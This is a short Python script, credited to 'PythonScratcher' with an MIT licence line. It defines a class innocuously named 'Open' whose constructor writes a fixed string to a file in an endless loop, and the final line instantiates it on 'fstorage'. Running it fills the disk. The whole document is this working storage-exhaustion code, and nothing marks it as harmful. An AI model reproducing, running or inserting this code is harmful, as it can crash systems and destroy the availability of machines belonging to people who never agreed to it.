class Open:
  def __init__(self, file: str, code: str):
    self.f = file
    self.c = code
    zzz = open(self.f, "w")
    while True:
      zzz.write(self.c)
# By PythonScratcher (PythonScratcher.eu.org) MIT LICENCE 
o = Open("fstorage", '12345677890123456789012345678901234567890|')
